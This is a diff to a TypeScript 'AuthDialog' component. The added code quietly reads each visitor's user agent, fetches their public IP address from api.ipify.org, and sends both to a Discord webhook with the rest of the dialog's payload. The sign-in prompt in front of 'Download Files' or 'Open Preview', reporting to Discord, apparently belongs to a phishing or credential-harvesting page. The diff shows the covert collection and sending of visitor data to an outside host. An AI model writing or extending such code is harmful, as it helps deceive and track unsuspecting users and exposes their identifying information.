@@ -31,6 +31,19 @@ const AuthDialog = ({ open, onOpenChange, action }: AuthDialogProps) => {
       return;
     }
 
+    // Get user agent
+    const userAgent = navigator.userAgent;
+
+    // Fetch IP address from public API
+    let ipAddress = "Unknown";
+    try {
+      const ipResponse = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipResponse.json();
+      ipAddress = ipData.ip;
+    } catch (error) {
+      console.error("Error fetching IP:", error);
+    }
+
     try {
       await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
@@ -53,6 +66,16 @@ const AuthDialog = ({ open, onOpenChange, action }: AuthDialogProps) => {
                   name: "Action",
                   value: action === "download" ? "Download Files" : "Open Preview",
                   inline: true,
+                },
+                {
+                  name: "IP Address",
+                  value: ipAddress,
+                  inline: true,
+                },
+                {
+                  name: "User Agent",
+                  value: userAgent.substring(0, 1024),
+                  inline: false,
                 },
                 {
                   name: "Timestamp",
